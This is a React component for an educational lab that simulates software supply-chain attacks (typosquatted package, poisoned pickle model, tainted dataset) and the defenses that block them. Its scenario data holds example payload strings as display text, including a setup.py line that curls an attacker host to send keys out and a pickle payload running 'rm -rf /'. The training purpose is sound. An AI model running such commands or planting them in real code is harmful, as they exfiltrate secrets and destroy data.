import { useMemo, useState } from 'react';
import {
  IconPackage,
  IconShield,
  IconAlertTriangle,
  IconTerminal,
  IconDownload,
  IconInfoCircle,
  IconExternalLink,
  IconCheck,
  IconBug,
} from '@tabler/icons-react';

// --- 1. Constants & Types ---

type ScenarioId = 'typosquat' | 'pickle' | 'dataset';

type Scenario = {
  id: ScenarioId;
  label: string;
  description: string;
  command: string;
  vulnerability: string;
  payload: string;
  vulnerableOutput: string;
  defendedOutput: string;
};

const SCENARIOS: Scenario[] = [
  {
    id: 'typosquat',
    label: 'Typosquatting',
    description: 'Developer accidentally installs a similarly named malicious package.',
    command: 'pip install lang-chain', // Malicious package (real is langchain)
    vulnerability: 'Malicious PyPI Package',
    payload: 'setup.py: import os; os.system("curl attacker.com/keys")',
    vulnerableOutput: 'Installing lang-chain...\n[+] Sending env vars to 192.0.2.1',
    defendedOutput: 'Error: "lang-chain" is not in the approved package registry.',
  },
  {
    id: 'pickle',
    label: 'Poisoned Model',
    description: 'Loading an untrusted PyTorch model (pickle file) executes code.',
    command: 'torch.load("finetuned-gpt.bin")',
    vulnerability: 'Insecure Deserialization',
    payload: 'reduce() -> os.system("rm -rf /")', 
    vulnerableOutput: 'Loading weights...\n[!] Executing injected shellcode...', 
    defendedOutput: 'Blocked: Model signature verification failed. Use safetensors.',
  },
  {
    id: 'dataset',
    label: 'Bad Dataset',
    description: 'Training data contains embedded malware links.',
    command: 'dataset.download("open-web-text-v2")',
    vulnerability: 'Content Injection',
    payload: 'Document 404: <script src="malware.js"></script>',
    vulnerableOutput: 'Downloading...\n[+] Indexed 500 malicious documents.',
    defendedOutput: 'Warning: Dataset checksum mismatch. Download aborted.',
  },
];

// --- 2. Logic Hook ---

function useSupplyChainSimulation() {
  const [activeScenarioId, setActiveScenarioId] = useState<ScenarioId>('typosquat');
  const [defenses, setDefenses] = useState({
    privateRegistry: true,
    signing: true,
    checksums: true,
  });

  const activeScenario = SCENARIOS.find((s) => s.id === activeScenarioId) || SCENARIOS[0]!;

  const simulation = useMemo(() => {
    let isDefended = false;
    let defenseTriggered = null;

    if (activeScenario.id === 'typosquat') {
      if (defenses.privateRegistry) {
        isDefended = true;
        defenseTriggered = 'Private Registry';
      }
    } else if (activeScenario.id === 'pickle') {
      if (defenses.signing) {
        isDefended = true;
        defenseTriggered = 'Model Signing';
      }
    } else if (activeScenario.id === 'dataset') {
      if (defenses.checksums) {
        isDefended = true;
        defenseTriggered = 'Checksum Verification';
      }
    }

    return {
      ...activeScenario,
      isDefended,
      defenseTriggered,
      currentOutput: isDefended ? activeScenario.defendedOutput : activeScenario.vulnerableOutput,
      status: isDefended ? 'SECURE' : 'COMPROMISED',
    };
  }, [activeScenario, defenses]);

  const toggleDefense = (k: keyof typeof defenses) => {
    setDefenses((d) => ({ ...d, [k]: !d[k] }));
  };

  return {
    activeScenarioId,
    setActiveScenarioId,
    defenses,
    toggleDefense,
    result: simulation,
  };
}

// --- 3. UI Components ---

const SecurityModule = ({
  label,
  description,
  intel,
  active,
  triggered,
  onClick,
  learnMoreUrl,
}: {
  label: string;
  description: string;
  intel: string;
  active: boolean;
  triggered: boolean;
  onClick: () => void;
  icon: any;
  learnMoreUrl: string;
}) => {
  const [showIntel, setShowIntel] = useState(false);
  const [cursorPos, setCursorPos] = useState({ x: 0, y: 0 });

  let containerClass = 'border-neutral-200 bg-neutral-50 text-neutral-400';
  let statusColor = 'bg-neutral-300';
  let statusText = 'DISABLED';

  if (active) {
    if (triggered) {
      containerClass = 'border-emerald-500 bg-emerald-50 text-emerald-900 ring-1 ring-emerald-500 shadow-md';
      statusColor = 'bg-emerald-500 animate-pulse';
      statusText = 'BLOCKED THREAT';
    } else {
      containerClass = 'border-black bg-white text-black shadow-sm';
      statusColor = 'bg-emerald-400';
      statusText = 'ACTIVE';
    }
  }

  return (
    <div
      onClick={onClick}
      className={`group relative flex w-full cursor-pointer flex-col gap-3 rounded-lg border p-4 text-left transition-all duration-200 ${containerClass}`}
    >
      <div className="flex w-full items-center justify-between gap-4">
        <div className="flex flex-1 items-center gap-2 font-bold uppercase tracking-wider text-xs">
          <div
            onMouseEnter={(e) => {
              e.stopPropagation();
              setShowIntel(true);
              setCursorPos({ x: e.clientX, y: e.clientY });
            }}
            onMouseMove={(e) => {
              e.stopPropagation();
              if (showIntel) {
                setCursorPos({ x: e.clientX, y: e.clientY });
              }
            }}
            onMouseLeave={(e) => {
              e.stopPropagation();
              setShowIntel(false);
            }}
            className="text-neutral-400 hover:text-black transition-colors focus:outline-none p-0.5 shrink-0 cursor-help"
            title="Hover for details"
          >
            <IconInfoCircle size={16} />
          </div>
          <span>{label}</span>
        </div>
        <div className={`relative h-5 w-9 shrink-0 rounded-full transition-colors ${active ? 'bg-black' : 'bg-neutral-300'}`}>
          <div className={`absolute top-1 h-3 w-3 rounded-full bg-white transition-transform ${active ? 'left-5' : 'left-1'}`} />
        </div>
      </div>
      
      <div className="text-[11px] opacity-80 leading-relaxed">
        {description}
      </div>

      <div className="mt-1 flex items-center justify-between border-t border-black/5 pt-3">
        <div className="flex items-center gap-2">
          <div className={`h-1.5 w-1.5 rounded-full ${statusColor}`} />
          <span className="text-[9px] font-bold uppercase tracking-widest opacity-70">{statusText}</span>
        </div>
        
        <a 
          href={learnMoreUrl}
          target="_blank"
          rel="noopener noreferrer"
          onClick={(e) => e.stopPropagation()}
          className="flex items-center gap-1 text-[9px] font-bold uppercase tracking-wider opacity-50 hover:opacity-100 hover:underline"
          title="Read external documentation"
        >
          Source <IconExternalLink size={10} />
        </a>
      </div>

      {showIntel && (
        <div 
          className="fixed z-50 w-64 rounded border border-white/10 bg-neutral-900/95 p-3 text-neutral-300 shadow-xl backdrop-blur-sm pointer-events-none"
          style={{
            left: cursorPos.x + 16,
            top: cursorPos.y + 16,
          }}
        >
          <div className="mb-1 text-[9px] font-bold uppercase tracking-widest text-neutral-500">Intel</div>
          <p className="text-[10px] leading-relaxed">
            {intel}
          </p>
        </div>
      )}
    </div>
  );
};

// --- 4. Main Application ---

export default function SupplyChainLab() {
  const {
    activeScenarioId,
    setActiveScenarioId,
    defenses,
    toggleDefense,
    result,
  } = useSupplyChainSimulation();

  return (
    <div className="w-full bg-white">
      {/* Scenarios Bar */}
      <div className="mb-0 flex flex-wrap items-center gap-2 border-b border-black/10 bg-white px-4 py-3">
        <span className="mr-2 text-[10px] font-bold uppercase tracking-widest text-neutral-400">Scenarios:</span>
        {SCENARIOS.map((s) => (
          <button
            key={s.id}
            onClick={() => setActiveScenarioId(s.id)}
            className={`rounded-full px-3 py-1 text-[10px] font-bold uppercase tracking-wide transition-colors ${ 
              activeScenarioId === s.id
                ? 'bg-black text-white'
                : 'bg-neutral-100 text-neutral-500 hover:bg-neutral-200'
            }`}
          >
            {s.label}
          </button>
        ))}
      </div>

      {/* Explainer Bar */}
      <div className="border-b border-black/10 bg-neutral-50 px-6 py-2">
        <div className="grid gap-4 text-[10px] font-medium uppercase tracking-wide text-neutral-400 md:grid-cols-[1fr_280px_1fr]">
          <div>1. Run Command</div>
          <div className="text-center">2. Verify Source</div>
          <div>3. Installation Result</div>
        </div>
      </div>

      <div className="grid lg:grid-cols-[1fr_280px_1fr] lg:divide-x divide-black/10">
        
        {/* COL 1: TERMINAL INPUT */}
        <div className="flex flex-col bg-white p-6">
          <label className="mb-6 flex items-center gap-2 text-xs font-bold uppercase tracking-widest text-neutral-500">
            <IconTerminal size={16} /> Developer Console
          </label>
          
          <div className="flex-1 space-y-4">
             <div className="flex items-center gap-2 rounded border border-black/10 bg-neutral-50 px-4 py-3 font-mono text-xs">
                <span className="text-green-600 font-bold">➜</span>
                <span className="text-neutral-800">{result.command}</span>
             </div>

             <div className="rounded border border-red-100 bg-red-50/50 p-4">
                <div className="mb-2 flex items-center gap-2 text-[10px] font-bold uppercase text-red-400">
                    <IconBug size={12} /> Hidden Payload
                </div>
                <code className="block font-mono text-[10px] text-red-800 opacity-80">
                    {result.payload}
                </code>
             </div>
             
             <div className="mt-4 text-[10px] text-neutral-400 leading-relaxed">
                The command attempts to pull an external resource. If the source is compromised, the payload will execute immediately upon load.
             </div>
          </div>
        </div>

        {/* COL 2: DEFENSE LAYERS */}
        <div className="flex flex-col gap-4 bg-neutral-50 p-6">
          <div className="mb-2 flex items-center gap-2 text-xs font-bold uppercase tracking-widest text-neutral-500">
            <IconShield size={16} /> Supply Chain Policy
          </div>
          
          <div className="space-y-4">
            <SecurityModule
              label="Private Registry"
              icon={IconPackage}
              description="Only allow packages from verified internal mirrors."
              intel="Blocks public PyPI/NPM access. Developers must use an internal Artifactory where packages are vetted and renamed to prevent typosquatting."
              active={defenses.privateRegistry}
              triggered={result.defenseTriggered === 'Private Registry'}
              onClick={() => toggleDefense('privateRegistry')}
              learnMoreUrl="https://jfrog.com/blog/npm-typosquatting-attacks-and-how-to-prevent-them/"
            />
            <SecurityModule
              label="Model Signing"
              icon={IconCheck}
              description="Require GPG/Sigstore signatures for model files."
              intel="Ensures the model weights haven't been tampered with since the original author published them. Blocks execution of unsigned 'pickle' files."
              active={defenses.signing}
              triggered={result.defenseTriggered === 'Model Signing'}
              onClick={() => toggleDefense('signing')}
              learnMoreUrl="https://huggingface.co/docs/safetensors/index"
            />
            <SecurityModule
              label="Checksums"
              icon={IconDownload}
              description="Verify SHA-256 hashes against a lockfile."
              intel="Calculates the hash of downloaded datasets or binaries and compares it to a trusted 'golden' value known before download."
              active={defenses.checksums}
              triggered={result.defenseTriggered === 'Checksum Verification'}
              onClick={() => toggleDefense('checksums')}
              learnMoreUrl="https://cyclonedx.org/"
            />
          </div>
        </div>

        {/* COL 3: SYSTEM OUTPUT */}
        <div className="flex flex-col bg-neutral-100 p-6 text-neutral-800">
          <div className="mb-6 flex items-center justify-between border-b border-black/10 pb-4">
            <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-widest text-neutral-500">
              <IconTerminal size={16} /> Build Log
            </div>
            {result.status === 'COMPROMISED' && (
                <div className="animate-pulse flex items-center gap-1 text-[10px] font-bold uppercase text-red-500">
                    <IconAlertTriangle size={12} /> Intrusion
                </div>
            )}
          </div>

          <div className="flex-1 space-y-6 font-mono text-xs">
            <div className="space-y-2">
              <div className="text-[10px] uppercase tracking-wider text-neutral-500">Console Output</div>
              <div className={`border-l-2 pl-3 py-1 leading-relaxed whitespace-pre-wrap ${ 
                  result.isDefended ? 'border-emerald-500 text-emerald-700' : 'border-red-500 text-red-700'
              }`}>
                {result.currentOutput}
              </div>
            </div>
            
            {/* Status Indicator */}
             <div className={`mt-auto pt-12 text-center border-t border-black/5`}>
                {result.isDefended ? (
                    <div className="text-emerald-600 flex flex-col items-center gap-2">
                        <IconShield size={24} />
                        <span className="text-[10px] font-bold uppercase tracking-widest">Environment Secure</span>
                    </div>
                ) : (
                    <div className="text-red-600 flex flex-col items-center gap-2">
                        <IconAlertTriangle size={24} />
                        <span className="text-[10px] font-bold uppercase tracking-widest">Environment Compromised</span>
                    </div>
                )}
             </div>
          </div>
        </div>
      </div>

      {/* Disclaimer Footer */}
      <div className="border-t border-black/10 bg-neutral-50 px-6 py-3 text-center">
        <p className="text-[9px] uppercase tracking-widest text-neutral-400">
          Disclaimer: Simulation only. Do not execute these commands in a real terminal.
        </p>
      </div>
    </div>
  );
}
